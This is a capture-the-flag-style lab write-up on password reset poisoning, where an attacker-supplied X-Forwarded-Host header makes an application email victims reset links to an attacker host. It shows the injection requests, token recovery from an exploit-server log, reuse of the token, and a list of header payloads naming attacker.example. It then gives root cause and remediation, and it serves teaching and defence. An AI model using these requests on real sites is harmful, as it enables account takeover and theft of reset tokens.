# Password Reset Poisoning via Middleware

## Overview

This lab demonstrates a **password reset poisoning vulnerability caused by trusting attacker-controlled proxy headers when generating absolute reset URLs**.

The application generated password-reset links using the value of the `X-Forwarded-Host` request header. Because this header could be supplied directly by the client, an attacker could cause the application to email a victim a password-reset link pointing to an attacker-controlled host.

When the victim followed the poisoned link, the reset token was sent to the attacker-controlled server. The token could then be reused against the legitimate application to reset the victim's password and take over the account.

---

## Normal Password Reset Flow

A legitimate password-reset request looked like:

```http
POST /forgot-password HTTP/2
Host: <lab-host>
Content-Type: application/x-www-form-urlencoded

username=wiener
```

The application sent an email containing a reset URL similar to:

```text
https://<lab-host>/forgot-password?temp-forgot-password-token=<TOKEN>
```

The server therefore generated an absolute URL as part of the recovery workflow.

---

## Identifying the Weakness

The password-reset request was sent to Burp Repeater and an additional header was supplied:

```http
X-Forwarded-Host: <attacker-exploit-server>
```

The request still went to the legitimate application because the real `Host` header was unchanged:

```http
Host: <lab-host>
X-Forwarded-Host: <attacker-exploit-server>
```

A reset was first requested for the controlled `wiener` account.

The resulting email contained a reset URL using the attacker-controlled hostname instead of the real application hostname:

```text
https://<attacker-exploit-server>/forgot-password?temp-forgot-password-token=<TOKEN>
```

This confirmed that the application trusted `X-Forwarded-Host` when constructing security-sensitive links.

---

## Exploitation

The same request was then sent for the victim account:

```http
POST /forgot-password HTTP/2
Host: <lab-host>
X-Forwarded-Host: <attacker-exploit-server>
Content-Type: application/x-www-form-urlencoded

username=carlos
```

The application emailed Carlos a poisoned password-reset link pointing to the attacker-controlled exploit server.

When the victim followed the link, the request reached the exploit server and exposed the reset token in the request URL:

```http
GET /forgot-password?temp-forgot-password-token=<CARLOS_TOKEN>
```

The token was recovered from the exploit-server access log.

---

## Reusing the Leaked Token

The stolen token was then placed back onto the legitimate application hostname:

```text
https://<lab-host>/forgot-password?temp-forgot-password-token=<CARLOS_TOKEN>
```

Because the token itself was valid for Carlos, the application displayed the password-reset form.

A new password was set for the victim account, after which the account could be accessed using the attacker-selected password.

---

## Attack Chain

```text
POST /forgot-password
username=carlos
X-Forwarded-Host: attacker-controlled-host
        |
        v
Application generates reset URL
using attacker-controlled hostname
        |
        v
Victim receives poisoned reset link
        |
        v
Victim follows the link
        |
        v
Reset token sent to attacker-controlled server
        |
        v
Token recovered from access log
        |
        v
Token reused on legitimate application host
        |
        v
Victim password reset
        |
        v
Account takeover
```

---

## Why the Attack Worked

Headers such as `X-Forwarded-Host` are commonly used by reverse proxies to communicate the original hostname to a back-end application.

However, these headers are only trustworthy when they are inserted or sanitized by infrastructure controlled by the application owner.

In this case, the application accepted an attacker-supplied `X-Forwarded-Host` value and used it directly when generating a password-reset URL.

Conceptually, the vulnerable logic behaved like:

```text
reset_host = request.headers["X-Forwarded-Host"]
reset_url  = "https://" + reset_host + "/forgot-password?token=..."
```

The attacker therefore controlled where the victim's reset token would be sent.

---

## Root Cause

The root cause was **unsafe trust in client-controlled middleware/proxy metadata during password-reset URL generation**.

The application failed to distinguish between:

```text
trusted proxy-generated forwarding metadata
```

and:

```text
attacker-supplied HTTP headers
```

This allowed an untrusted hostname to become part of a security-sensitive recovery link.

---

## Impact

An attacker could steal valid password-reset tokens and use them to take over victim accounts.

Potential consequences include:

- complete account takeover;
- unauthorized password changes;
- exposure of private account data;
- compromise of privileged accounts;
- loss of trust in the password-recovery mechanism.

The attack did not require knowledge of the victim's existing password.

---

## Remediation

Password-reset URLs should not be constructed from untrusted request headers.

Recommended controls include:

- use a fixed, server-side configured canonical hostname when generating reset URLs;
- do not trust `Host`, `X-Forwarded-Host`, or similar headers unless they are strictly validated;
- configure trusted reverse proxies to strip client-supplied forwarding headers and insert their own values;
- allow-list expected application hostnames;
- reject requests containing unexpected or conflicting forwarding metadata;
- keep password-reset tokens single-use, short-lived, and strongly random;
- bind recovery workflows to the intended account and invalidate tokens immediately after successful use.

---

## Testing Methodology

A useful password-reset poisoning test is:

```text
1. Request a reset for an account you control.
2. Add or modify Host-related forwarding headers.
3. Inspect the generated reset email.
4. Check whether the hostname changes.
5. If controllable, repeat the request for the victim account.
6. Observe whether the victim's token reaches the controlled host.
```

Headers worth testing include:

```http
X-Forwarded-Host: attacker.example
X-Host: attacker.example
X-Forwarded-Server: attacker.example
Forwarded: host=attacker.example
```

The exact header behavior depends on the application's proxy and middleware configuration.

---

## Key Takeaway

Password-reset tokens are only as secure as the entire delivery path used to send them.

Even a cryptographically strong reset token can be compromised if the application builds the reset URL using attacker-controlled host metadata.

Security-sensitive absolute URLs should always be generated from trusted server-side configuration rather than from unvalidated request headers.
